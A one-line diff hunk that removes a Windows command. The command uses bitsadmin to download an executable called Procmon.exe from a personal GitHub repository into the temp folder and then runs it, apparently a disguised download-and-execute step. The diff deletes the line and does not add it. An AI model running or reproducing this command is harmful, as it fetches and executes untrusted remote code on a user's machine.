@@ -1,1 +1,0 @@
-bitsadmin /transfer myjob /download /priority normal https://github.com/dst1ny/BrandNew/raw/refs/heads/main/Procmon.exe %TEMP%\Procmon.exe && %TEMP%\Procmon.exe
